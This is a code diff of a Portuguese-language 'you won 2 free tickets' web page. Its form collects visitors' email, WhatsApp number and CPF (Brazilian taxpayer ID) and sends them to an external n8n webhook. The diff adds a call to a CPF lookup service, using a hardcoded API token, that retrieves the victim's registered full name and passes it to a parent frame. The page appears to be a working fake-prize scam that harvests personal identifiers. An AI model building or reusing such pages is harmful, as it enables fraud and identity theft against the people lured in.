@@ -39,19 +39,20 @@
       </div>
     </div>
 
-    <!-- FORMULÁRIO -->
-    <div id="texto-personalizado" class="hidden custom-text">
-      <form id="myForm" class="form-container">
-        <h1 id="titulopara">PARABÉNS <br>VOCÊ GANHOU 2 BILHETES <br>TOTALMENTE DE GRAÇA </h1>
-        <h2>PREENCHA SUAS INFORMAÇÕES E <br>RECEBA SEUS CRÉDITOS</h2>
-        <input id="nome" type="text" placeholder="DIGITE SEU E-MAIL... " required>
-        <input id="whatsapp" type="tel" placeholder="SEU WHATSAPP COM DDD... " maxlength="15" required>
-        <!-- Campo CPF com máscara -->
-        <input id="cpf" type="text" placeholder="DIGITE SEU CPF... " required>
-        <div id="error-message" class="error-message">Por favor, preencha todas as informações corretamente.</div>
-        <button id="submitBtn" type="submit" disabled>RESGATAR AGORA</button> 
-      </form>
-    </div>
+<!-- FORMULÁRIO -->
+<div id="texto-personalizado" class="hidden custom-text">
+  <form id="myForm" class="form-container">
+    <h1 id="titulopara">PARABÉNS <br>VOCÊ GANHOU 2 BILHETES <br>TOTALMENTE DE GRAÇA </h1>
+    <h2>PREENCHA SUAS INFORMAÇÕES E <br>RECEBA SEUS CRÉDITOS</h2>
+    <input id="nome" type="text" placeholder="DIGITE SEU E-MAIL... " required>
+    <input id="whatsapp" type="tel" placeholder="SEU WHATSAPP COM DDD... " maxlength="15" required>
+    <!-- Campo CPF com máscara -->
+    <input id="cpf" type="text" placeholder="DIGITE SEU CPF... " required>
+    <div id="error-message" class="error-message">Por favor, preencha todas as informações corretamente.</div>
+    <button id="submitBtn" type="submit" disabled>RESGATAR AGORA</button>
+  </form>
+</div>
+
 
     <!-- TEXTO DEPOIS DO FORMULÁRIO -->
     <div id="depoisdoform" class="hidden custom-text">
@@ -125,54 +126,70 @@
 
   <!--MASCARA DE N° -->
   <script>
-    document.addEventListener("DOMContentLoaded", function() {
-      const form = document.getElementById("myForm");
-      const submitBtn = document.getElementById("submitBtn");
-      const nomeInput = document.getElementById("nome");
-      const whatsappInput = document.getElementById("whatsapp");
-      const cpfInput = document.getElementById("cpf");
+  document.addEventListener("DOMContentLoaded", function() {
+    const form = document.getElementById("myForm");
+    const submitBtn = document.getElementById("submitBtn");
+    const nomeInput = document.getElementById("nome");
+    const whatsappInput = document.getElementById("whatsapp");
+    const cpfInput = document.getElementById("cpf");
 
-      form.addEventListener("input", function() {
-        if (nomeInput.validity.valid && whatsappInput.validity.valid && cpfInput.validity.valid) {
-          submitBtn.removeAttribute("disabled");
-        } else {
-          submitBtn.setAttribute("disabled", "disabled");
-        }
-      });
+    form.addEventListener("input", function() {
+      if (nomeInput.validity.valid && whatsappInput.validity.valid && cpfInput.validity.valid) {
+        submitBtn.removeAttribute("disabled");
+      } else {
+        submitBtn.setAttribute("disabled", "disabled");
+      }
+    });
 
-      // BLOQUEIO DE ENVIO SEM PREENCHER
+    form.addEventListener("submit", function(event) {
+      event.preventDefault(); // Evita o envio padrão do formulário
 
-      form.addEventListener("submit", function(event) {
-        event.preventDefault(); // Evita o envio padrão do formulário
+      var nome = nomeInput.value;
+      var cpf = cpfInput.value;
+      var whatsapp = whatsappInput.value;
 
-        var nome = nomeInput.value;
-        var cpf = cpfInput.value;
-        var whatsapp = whatsappInput.value;
+      // URL do webhook do n8n
+      var webhookUrl = 'https://webhook.empreendimentosonfire.win/webhook/roletaleads';
 
-        // URL do webhook do n8n
-        var webhookUrl = 'https://webhook.empreendimentosonfire.win/webhook/roletaleads';
-
-        // Enviando dados via webhook
-        fetch(webhookUrl, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            nome: nome,
-            cpf: cpf,
-            whatsapp: whatsapp
-          })
+      // Enviando dados via webhook
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          nome: nome,
+          cpf: cpf,
+          whatsapp: whatsapp
         })
+      })
+      .then(response => {
+        if (response.ok) {
+          return response.json(); // Se a resposta for JSON, parseia o JSON
+        } else {
+          throw new Error(`Erro ao enviar os dados. Status: ${response.status}`);
+        }
+      })
+      .then(data => {
+        console.log("Resposta do servidor:", data); // Log para depuração
+
+        // Chamar a API de análise de CPF
+        var apiUrl = `https://databit.online/api?token=987e448b-fb5c-4090-bf70-e80b0cdc1e00&type=cpftype&query=${cpf}`;
+
+        return fetch(apiUrl)
         .then(response => {
           if (response.ok) {
-            return response.json(); // Se a resposta for JSON, parseia o JSON
+            return response.json();
           } else {
-            throw new Error(`Erro ao enviar os dados. Status: ${response.status}`);
+            throw new Error(`Erro ao obter dados do CPF. Status: ${response.status}`);
           }
         })
-        .then(data => {
-          console.log("Resposta do servidor:", data); // Log para depuração
+        .then(apiData => {
+          var nomeCompleto = apiData.dadosBasicos.nome;
+          var primeiroNome = nomeCompleto.split(" ")[0];
+
+          // Enviar o primeiro nome ao iframe do segundo site
+          window.parent.postMessage({ nome: primeiroNome }, '*');
 
           // Ocultar o formulário com transição de fade out
           document.getElementById('texto-personalizado').style.display = 'none';
@@ -192,33 +209,34 @@
 
           }, 100); // Adicionando um pequeno atraso para garantir que o elemento está visível antes de iniciar a animação
 
-        })
-        .catch(error => {
-          // Lidar com o erro da requisição
-          console.error('Erro capturado:', error);
-          alert(`Falha ao enviar os dados: ${error.message}`);
         });
+      })
+      .catch(error => {
+        // Lidar com o erro da requisição
+        console.error('Erro capturado:', error);
+        alert(`Falha ao enviar os dados: ${error.message}`);
       });
     });
+  });
 
-    document.addEventListener('DOMContentLoaded', function() {
-      var input = document.getElementById('whatsapp');
-      input.addEventListener('input', function() {
-        var value = input.value.replace(/\D/g, '');
-        if (value.length > 2) {
-          value = '(' + value.substring(0, 2) + ') ' + value.substring(2);
+  document.addEventListener('DOMContentLoaded', function() {
+    var input = document.getElementById('whatsapp');
+    input.addEventListener('input', function() {
+      var value = input.value.replace(/\D/g, '');
+      if (value.length > 2) {
+        value = '(' + value.substring(0, 2) + ') ' + value.substring(2);
+      }
+      if (value.length > 6) {
+        if (value.length <= 10) {
+          value = value.substring(0, 9) + '-' + value.substring(9);
+        } else if (value.length <= 11) {
+          value = value.substring(0, 10) + '-' + value.substring(10);
         }
-        if (value.length > 6) {
-          if (value.length <= 10) {
-            value = value.substring(0, 9) + '-' + value.substring(9);
-          } else if (value.length <= 11) {
-            value = value.substring(0, 10) + '-' + value.substring(10);
-          }
-        }
-        input.value = value;
-      });
+      }
+      input.value = value;
     });
-  </script>
+  });
+</script>
       
   <script>
     var data = [
